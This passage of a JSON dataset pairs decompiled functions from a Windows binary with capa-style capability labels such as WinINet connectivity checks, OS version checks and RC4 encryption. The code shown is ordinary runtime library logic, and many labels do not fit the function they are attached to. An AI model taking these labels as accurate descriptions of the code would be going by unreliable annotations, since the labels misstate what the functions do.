        "decompiled_code": "\nvoid __cdecl fcn.00401a69(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint arg_8h_00;\n    \n    if ((*(in_ECX + 1) < '\\x02') && (arg_8h != 0)) {\n        arg_8h_00 = 0;\n        if (*in_ECX == 0) {\n            fcn.004023ce(arg_8h);\n        }\n        else {\n            cVar1 = *(arg_8h + 4);\n            if ((cVar1 == '\\0') || (cVar1 == '\\x01')) {\n                iVar2 = fcn.0040528b(8);\n                if (iVar2 != 0) {\n                    arg_8h_00 = fcn.00403995(arg_8h);\n                }\n                fcn.004063b1(arg_8h_00);\n            }\n            else {\n                fcn.0040658c(cVar1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "00401a8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401a8c(int32_t *arg_8h)\n\n{\n    int32_t *in_ECX;\n    \n    if (*(in_ECX + 1) == '\\0') {\n        fcn.00405d21();\n    }\n    if (*(arg_8h + 1) == '\\0') {\n        fcn.00405d21();\n    }\n    if (*in_ECX == 0) {\n        if (*arg_8h != 0) {\n            return 0;\n        }\n    }\n    else if (*arg_8h == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 143
    },
    "00401aaa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401aaa(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    int16_t *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n        *(param_1 + 0x28) = *(*(param_1 + 0x14) + -4);\n    }\n    else {\n        var_4h = NULL;\n        iVar1 = fcn.00403675(*(param_1 + 0x10), &var_4h, 10);\n        iVar1 = iVar1 + -1;\n        *(param_1 + 0x10) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar1) && (*var_4h == 0x24)) && (iVar1 < 100)) {\n                iVar2 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar1) {\n                    iVar2 = iVar1;\n                }\n                *(param_1 + 0xaa4) = iVar2;\n                uVar3 = fcn.004038a0(param_1 + 0x464 + iVar1 * 0x10, 1, *(param_1 + 0x32), *(param_1 + 0x2c));\n                return uVar3;\n            }\n            puVar4 = fcn.00403a35();\n            *puVar4 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        *(param_1 + 0x28) = **(param_1 + 0x46c + iVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 441
    },
    "00401ab9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401ab9(uchar *arg_8h, int32_t arg_ch)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    uint *in_ECX;\n    uint var_4h;\n    \n    if ((arg_8h == NULL) || (arg_ch < 1)) {\n        *(in_ECX + 1) = 2;\n        return;\n    }\n    if (arg_ch == 1) {\n        ppcVar3 = fcn.0040528b(8);\n        if (ppcVar3 != NULL) {\n            uVar1 = *arg_8h;\n            *ppcVar3 = vtable.charNode.0;\n            *(ppcVar3 + 1) = uVar1;\n            goto code_r0x0048b78c;\n        }\n    }\n    else {\n        iVar2 = fcn.0040528b(0xc);\n        if (iVar2 != 0) {\n            ppcVar3 = fcn.00405790(arg_8h, arg_ch);\n            goto code_r0x0048b78c;\n        }\n    }\n    ppcVar3 = NULL;\ncode_r0x0048b78c:\n    *in_ECX = ppcVar3;\n    if (ppcVar3 == NULL) {\n        *(in_ECX + 1) = 3;\n    }\n    return;\n}\n",
        "token_count": 315
    },
    "00401abe": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00401abe(uint arg_8h, int32_t arg_ch, uint arg_10h, uint32_t arg_14h, int32_t *arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_stack_ffffff5c;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_88h = arg_10h;\n    *arg_18h = 0;\n    if (arg_ch == 1) {\n        iVar2 = fcn.004d4b0d(arg_8h, arg_10h, arg_14h, &fcn.00401abe::var_84h, 0x80);\n        if (iVar2 != 0) {\n            in_stack_ffffff5c = 1;\n            iVar3 = fcn.00405088(iVar2, 1);\n            *arg_18h = iVar3;\n            fcn.0040640b(0);\n            if (*arg_18h != 0) {\n                in_stack_ffffff5c = iVar2 + -1;\n                iVar2 = fcn.00402a04(*arg_18h, iVar2, &fcn.00401abe::var_84h, in_stack_ffffff5c);\n                if (iVar2 != 0) {\n                    fcn.0040366b(0, 0, 0, 0, 0);\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n            }\n            goto code_r0x004d4db9;\n        }\n        in_stack_ffffff5c = 0x4d4ccf;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if ((iVar2 != 0x7a) || (iVar2 = fcn.004d4b0d(arg_8h, arg_10h, arg_14h, 0, 0),  iVar2 == 0))\n        goto code_r0x004d4db9;\n        iVar3 = fcn.00405088(iVar2, 1);\n        if (iVar3 != 0) {\n            iVar2 = fcn.004d4b0d(arg_8h, var_88h, arg_14h, iVar3, iVar2);\ncode_r0x004d4d28:\n            if (iVar2 != 0) {\n                *arg_18h = iVar3;\n                iVar3 = 0;\n            }\n        }\n    }\n    else {\n        if (arg_ch != 2) {\n            if (arg_ch == 0) {\n                in_stack_ffffff5c = 2;\n                var_88h = 0;\n                iVar2 = fcn.00404809(arg_10h, arg_14h | 0x20000000, &fcn.00401abe::var_88h, 2);\n                if (iVar2 != 0) {\n                    *arg_18h = var_88h;\n                }\n            }\n            goto code_r0x004d4db9;\n        }\n        in_stack_ffffff5c = 0;\n        iVar2 = fcn.00404809(arg_10h, arg_14h, 0, 0);\n        if (iVar2 == 0) goto code_r0x004d4db9;\n        iVar3 = fcn.00405088(iVar2, 2);\n        if (iVar3 != 0) {\n            iVar2 = fcn.00404809(var_88h, arg_14h, iVar3, iVar2);\n            goto code_r0x004d4d28;\n        }\n    }\n    fcn.0040640b(iVar3);\ncode_r0x004d4db9:\n    fcn.004030bc(in_stack_ffffff5c);\n    return;\n}\n",
        "token_count": 908
    },
    "00401adc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00401adc(void)\n\n{\n    int32_t in_FS_OFFSET;\n    int32_t iStackY20;\n    int32_t var_4h;\n    \n    if (*0x575494 == 0) {\n        var_4h = 2;\n        if (-1 < *(*(*(in_FS_OFFSET + 0x30) + 0x10) + 8)) {\n            fcn.00405a6f(&var_4h);\n        }\n        *0x575494 = 2;\n        if (var_4h != 1) {\n            if (var_4h == 2) {\n                *0x575494 = 1;\n            }\n            else if (var_4h == 3) {\n                iStackY20 = 3;\n                *0x575494 = iStackY20;\n            }\n            else {\n                iStackY20 = 4;\n                *0x575494 = iStackY20;\n            }\n        }\n    }\n    return *0x575494;\n}\n",
        "token_count": 226
    },
    "00401aeb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401aeb(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    for (iVar1 = 6; 0 < iVar1; iVar1 = iVar1 + -1) {\n    }\n    fcn.00403b02(&stack0x00000008, iVar1, *0x546e78);\n    return;\n}\n",
        "token_count": 83
    },
    "00401b45": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00401b45(char *arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    uint var_14h;\n    uint var_ch;\n    uchar *lpOutputString;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    if (arg_8h != NULL) {\n        pcVar3 = arg_8h;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        iVar2 = (pcVar3 - (arg_8h + 1)) + 1;\n        if (iVar2 != 0) {\n            fcn.004034f4();\n            lpOutputString = &var_14h;\n            iVar2 = fcn.00402455(&var_ch, &var_14h, iVar2, arg_8h, pcVar3 - (arg_8h + 1));\n            if (iVar2 == 0) {\n                (*_sym.imp.KERNEL32.dll_OutputDebugStringW)(lpOutputString);\n            }\n        }\n    }\n    fcn.004030bc(var_ch);\n    return;\n}\n",
        "token_count": 315
    },
    "00401b77": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00401b77(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint arg_18h;\n    uint32_t uVar3;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uchar var_4h;\n    uchar var_3h;\n    uint var_2h;\n    \n    if (arg_8h == 0xffffffff) {\n        return 0xffffffff;\n    }\n    fcn.004058a8(arg_ch);\n    if (arg_8h < 0x100) {\n        uVar3 = *(*(var_18h + 0x94) + (arg_8h & 0xff));\n        if (var_10h == '\\0') {\n            return uVar3;\n        }\n        *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n        return uVar3;\n    }\n    var_2h._0_1_ = 0;\n    if (1 < *(var_18h + 4)) {\n        var_ch = arg_8h >> 8;\n        iVar1 = fcn.00405a24(var_ch & 0xff, &var_18h);\n        if (iVar1 != 0) {\n            var_2h._0_1_ = 0;\n            arg_18h = 2;\n            var_4h = var_ch;\n            var_3h = arg_8h;\n            goto code_r0x004bf4a0;\n        }\n    }\n    puVar2 = fcn.00403a35();\n    *puVar2 = 0x2a;\n    arg_18h = 1;\n    var_3h = 0;\n    var_4h = arg_8h;\ncode_r0x004bf4a0:\n    var_8h._0_2_ = 0;\n    var_8h._2_1_ = 0;\n    iVar1 = fcn.00405e70(&var_18h, *(var_18h + 0xa8), 0x100, &var_4h, arg_18h, &var_8h, 3, *(var_18h + 8), 1);\n    if (iVar1 != 0) {\n        arg_8h = var_8h;\n        if (iVar1 != 1) {\n            arg_8h = CONCAT11(var_8h, var_8h._1_1_);\n        }\n    }\n    if (var_10h != '\\0') {\n        *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n    }\n    return arg_8h;\n}\n",
        "token_count": 674
    },
    "00401bb3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar (*) [16] __cdecl fcn.00401bb3(uchar (*arg_8h) [16], uint arg_ch)\n\n{\n    char *pcVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    uchar (*pauVar4) [16];\n    uint32_t uVar5;\n    int32_t iVar6;\n    uchar (*pauVar7) [16];\n    char *pcVar8;\n    uint8_t *puVar9;\n    uchar auVar11 [16];\n    uchar auVar13 [16];\n    char cVar16;\n    char cVar17;\n    char cVar18;\n    char cVar19;\n    char cVar20;\n    char cVar21;\n    char cVar22;\n    uchar auVar15 [16];\n    uint8_t *puVar10;\n    uint8_t uVar12;\n    uint8_t uVar14;\n    \n    if (*0x573c4c != 0) {\n        if (*0x573c4c < 2) {\n            auVar15 = pshuflw(ZEXT216(CONCAT11(arg_ch, arg_ch)), ZEXT216(CONCAT11(arg_ch, arg_ch)), 0);\n            uVar3 = -1 << (arg_8h & 0xf);\n            pcVar8 = arg_8h - (arg_8h & 0xf);\n            pauVar7 = NULL;\n            while( true ) {\n                uVar14 = -(pcVar8[0xf] == '\\0');\n                auVar13 = CONCAT115(uVar14, CONCAT114(-(pcVar8[0xe] == '\\0'), \n                                                      CONCAT113(-(pcVar8[0xd] == '\\0'), \n                                                                CONCAT112(-(pcVar8[0xc] == '\\0'), \n                                                                          CONCAT111(-(pcVar8[0xb] == '\\0'), \n                                                                                    CONCAT110(-(pcVar8[10] == '\\0'), \n                                                                                              CONCAT19(-(pcVar8[9] ==\n                                                                                                        '\\0'), CONCAT18(\n                                                            -(pcVar8[8] == '\\0'), \n                                                            CONCAT17(-(pcVar8[7] == '\\0'), \n                                                                     CONCAT16(-(pcVar8[6] == '\\0'), \n                                                                              CONCAT15(-(pcVar8[5] == '\\0'), \n                                                                                       CONCAT14(-(pcVar8[4] == '\\0'), \n                                                                                                CONCAT13(-(pcVar8[3] ==\n                                                                                                          '\\0'), \n                                                            CONCAT12(-(pcVar8[2] == '\\0'), \n                                                                     CONCAT11(-(pcVar8[1] == '\\0'), -(*pcVar8 == '\\0')))\n                                                            )))))))))))));\n                cVar16 = SUB161(auVar15 >> 8, 0);\n                cVar17 = SUB161(auVar15 >> 0x10, 0);\n                cVar18 = SUB161(auVar15 >> 0x18, 0);\n                cVar19 = SUB161(auVar15 >> 0x20, 0);\n                cVar20 = SUB161(auVar15 >> 0x28, 0);\n                cVar21 = SUB161(auVar15 >> 0x30, 0);\n                cVar22 = SUB161(auVar15 >> 0x38, 0);\n                uVar12 = -(pcVar8[0xf] == cVar22);\n                auVar11 = CONCAT115(uVar12, CONCAT114(-(pcVar8[0xe] == cVar21), \n                                                      CONCAT113(-(pcVar8[0xd] == cVar20), \n                                                                CONCAT112(-(pcVar8[0xc] == cVar19), \n                                                                          CONCAT111(-(pcVar8[0xb] == cVar18), \n                                                                                    CONCAT110(-(pcVar8[10] == cVar17), \n                                                                                              CONCAT19(-(pcVar8[9] ==\n                                                                                                        cVar16), \n                                                                                                       CONCAT18(-(pcVar8\n                                                            [8] == SUB161(auVar15, 0)), \n                                                            CONCAT17(-(pcVar8[7] == cVar22), \n                                                                     CONCAT16(-(pcVar8[6] == cVar21), \n                                                                              CONCAT15(-(pcVar8[5] == cVar20), \n                                                                                       CONCAT14(-(pcVar8[4] == cVar19), \n                                                                                                CONCAT13(-(pcVar8[3] ==\n                                                                                                          cVar18), \n                                                                                                         CONCAT12(-(\n                                                            pcVar8[2] == cVar17), \n                                                            CONCAT11(-(pcVar8[1] == cVar16), \n                                                                     -(*pcVar8 == SUB161(auVar15, 0)))))))))))))))));\n                uVar5 = (SUB161(auVar13 >> 7, 0) & 1 | (SUB161(auVar13 >> 0xf, 0) & 1) << 1 |\n                         (SUB161(auVar13 >> 0x17, 0) & 1) << 2 | (SUB161(auVar13 >> 0x1f, 0) & 1) << 3 |\n                         (SUB161(auVar13 >> 0x27, 0) & 1) << 4 | (SUB161(auVar13 >> 0x2f, 0) & 1) << 5 |\n                         (SUB161(auVar13 >> 0x37, 0) & 1) << 6 | (SUB161(auVar13 >> 0x3f, 0) & 1) << 7 |\n                         (SUB161(auVar13 >> 0x47, 0) & 1) << 8 | (SUB161(auVar13 >> 0x4f, 0) & 1) << 9 |\n                         (SUB161(auVar13 >> 0x57, 0) & 1) << 10 | (SUB161(auVar13 >> 0x5f, 0) & 1) << 0xb |\n                         (SUB161(auVar13 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar13 >> 0x6f, 0) & 1) << 0xd |\n                         (SUB161(auVar13 >> 0x77, 0) & 1) << 0xe | (uVar14 >> 7) << 0xf) & uVar3;\n                if (uVar5 != 0) break;\n                uVar3 = (SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                         (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                         (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                         (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                         (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                         (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                         (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                         (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (uVar12 >> 7) << 0xf) & uVar3;\n                iVar6 = 0x1f;\n                if (uVar3 != 0) {\n                    for (; uVar3 >> iVar6 == 0; iVar6 = iVar6 + -1) {\n                    }\n                }\n                if (uVar3 != 0) {\n                    pauVar7 = pcVar8 + iVar6;\n                }\n                uVar3 = 0xffffffff;\n                pcVar8 = pcVar8 + 0x10;\n            }\n            uVar3 = (uVar5 * 2 & uVar5 * -2) - 1 &\n                    (SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                     (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                     (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                     (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                     (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                     (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                     (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                     (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (uVar12 >> 7) << 0xf) & uVar3;\n            iVar6 = 0x1f;\n            if (uVar3 != 0) {\n                for (; uVar3 >> iVar6 == 0; iVar6 = iVar6 + -1) {\n                }\n            }\n            pauVar4 = pcVar8 + iVar6;\n            if (uVar3 == 0) {\n                pauVar4 = pauVar7;\n            }\n            return pauVar4;\n        }\n        uVar3 = arg_ch;\n        if (uVar3 == 0) {\n            pcVar8 = arg_8h & 0xfffffff0;\n            auVar15 = CONCAT115(-(pcVar8[0xf] == '\\0'), \n                                CONCAT114(-(pcVar8[0xe] == '\\0'), \n                                          CONCAT113(-(pcVar8[0xd] == '\\0'), \n                                                    CONCAT112(-(pcVar8[0xc] == '\\0'), \n                                                              CONCAT111(-(pcVar8[0xb] == '\\0'), \n                                                                        CONCAT110(-(pcVar8[10] == '\\0'), \n                                                                                  CONCAT19(-(pcVar8[9] == '\\0'), \n                                                                                           CONCAT18(-(pcVar8[8] == '\\0')\n                                                                                                    , CONCAT17(-(pcVar8[\n                                                            7] == '\\0'), \n                                                            CONCAT16(-(pcVar8[6] == '\\0'), \n                                                                     CONCAT15(-(pcVar8[5] == '\\0'), \n                                                                              CONCAT14(-(pcVar8[4] == '\\0'), \n                                                                                       CONCAT13(-(pcVar8[3] == '\\0'), \n                                                                                                CONCAT12(-(pcVar8[2] ==\n                                                                                                          '\\0'), \n                                                            CONCAT11(-(pcVar8[1] == '\\0'), -(*pcVar8 == '\\0'))))))))))))\n                                                            ))));\n            uVar3 = (SUB161(auVar15 >> 7, 0) & 1 | (SUB161(auVar15 >> 0xf, 0) & 1) << 1 |\n                     (SUB161(auVar15 >> 0x17, 0) & 1) << 2 | (SUB161(auVar15 >> 0x1f, 0) & 1) << 3 |\n                     (SUB161(auVar15 >> 0x27, 0) & 1) << 4 | (SUB161(auVar15 >> 0x2f, 0) & 1) << 5 |\n                     (SUB161(auVar15 >> 0x37, 0) & 1) << 6 | (SUB161(auVar15 >> 0x3f, 0) & 1) << 7 |\n                     (SUB161(auVar15 >> 0x47, 0) & 1) << 8 | (SUB161(auVar15 >> 0x4f, 0) & 1) << 9 |\n                     (SUB161(auVar15 >> 0x57, 0) & 1) << 10 | (SUB161(auVar15 >> 0x5f, 0) & 1) << 0xb |\n                     (SUB161(auVar15 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar15 >> 0x6f, 0) & 1) << 0xd |\n                     (SUB161(auVar15 >> 0x77, 0) & 1) << 0xe | (-(pcVar8[0xf] == '\\0') >> 7) << 0xf) &\n                    -1 << (arg_8h & 0xf);\n            while (uVar3 == 0) {\n                pcVar1 = pcVar8 + 0x1f;\n                auVar15 = CONCAT115(-(*pcVar1 == '\\0'), \n                                    CONCAT114(-(pcVar8[0x1e] == '\\0'), \n                                              CONCAT113(-(pcVar8[0x1d] == '\\0'), \n                                                        CONCAT112(-(pcVar8[0x1c] == '\\0'), \n                                                                  CONCAT111(-(pcVar8[0x1b] == '\\0'), \n                                                                            CONCAT110(-(pcVar8[0x1a] == '\\0'), \n                                                                                      CONCAT19(-(pcVar8[0x19] == '\\0'), \n                                                                                               CONCAT18(-(pcVar8[0x18]\n                                                                                                         == '\\0'), \n                                                                                                        CONCAT17(-(\n                                                            pcVar8[0x17] == '\\0'), \n                                                            CONCAT16(-(pcVar8[0x16] == '\\0'), \n                                                                     CONCAT15(-(pcVar8[0x15] == '\\0'), \n                                                                              CONCAT14(-(pcVar8[0x14] == '\\0'), \n                                                                                       CONCAT13(-(pcVar8[0x13] == '\\0')\n                                                                                                , CONCAT12(-(pcVar8[0x12\n                                                            ] == '\\0'), \n                                                            CONCAT11(-(pcVar8[0x11] == '\\0'), -(pcVar8[0x10] == '\\0'))))\n                                                            ))))))))))));\n                pcVar8 = pcVar8 + 0x10;\n                uVar3 = SUB161(auVar15 >> 7, 0) & 1 | (SUB161(auVar15 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar15 >> 0x17, 0) & 1) << 2 | (SUB161(auVar15 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar15 >> 0x27, 0) & 1) << 4 | (SUB161(auVar15 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar15 >> 0x37, 0) & 1) << 6 | (SUB161(auVar15 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar15 >> 0x47, 0) & 1) << 8 | (SUB161(auVar15 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar15 >> 0x57, 0) & 1) << 10 | (SUB161(auVar15 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar15 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar15 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar15 >> 0x77, 0) & 1) << 0xe | (-(*pcVar1 == '\\0') >> 7) << 0xf;\n            }\n            iVar6 = 0;\n            if (uVar3 != 0) {\n                for (; (uVar3 >> iVar6 & 1) == 0; iVar6 = iVar6 + 1) {\n                }\n            }\n            pauVar7 = pcVar8 + iVar6;\n        }\n        else {\n            pauVar7 = NULL;\n            uVar5 = arg_8h & 0xf;\n            while (uVar5 != 0) {\n                if ((*arg_8h)[0] == uVar3) {\n                    pauVar7 = arg_8h;\n                }\n                if ((*arg_8h)[0] == 0) {\n                    return pauVar7;\n                }\n                arg_8h = *arg_8h + 1;\n                uVar5 = arg_8h & 0xf;\n            }\n            do {\n                pauVar4 = arg_8h[1];\n                iVar6 = pcmpistri(ZEXT416(uVar3), *arg_8h, 0x40);\n                if (0xffffffef < arg_8h) {\n                    pauVar7 = pauVar4[-1] + iVar6;\n                }\n                arg_8h = pauVar4;\n            } while (pauVar4 != NULL);\n        }\n        return pauVar7;\n    }\n    iVar6 = -1;\n    do {\n        pauVar7 = arg_8h;\n        if (iVar6 == 0) break;\n        iVar6 = iVar6 + -1;\n        pauVar7 = *arg_8h + 1;\n        puVar2 = *arg_8h;\n        arg_8h = pauVar7;\n    } while (*puVar2 != '\\0');\n    iVar6 = -(iVar6 + 1);\n    puVar10 = pauVar7[-1] + 0xf;\n    do {\n        puVar9 = puVar10;\n        if (iVar6 == 0) break;\n        iVar6 = iVar6 + -1;\n        puVar9 = puVar10 + -1;\n        uVar12 = *puVar10;\n        puVar10 = puVar9;\n    } while (arg_ch != uVar12);\n    pauVar7 = puVar9 + 1;\n    if ((*pauVar7)[0] != arg_ch) {\n        pauVar7 = NULL;\n    }\n    return pauVar7;\n}\n",
        "token_count": 4344
    },
    "00401bcc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401bcc(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.00403675(*(in_ECX + 0x10) + -2, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 354
    },
    "00401bef": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401bef(int32_t *arg_8h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        cVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            uVar3 = fcn.004037ce();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040117c(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        cVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = cVar1;\n    arg_8h[1] = cVar1 >> 0x1f;\n    return CONCAT31(cVar1 >> 7, 1);\n}\n",
        "token_count": 347
    },
    "00401bf4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
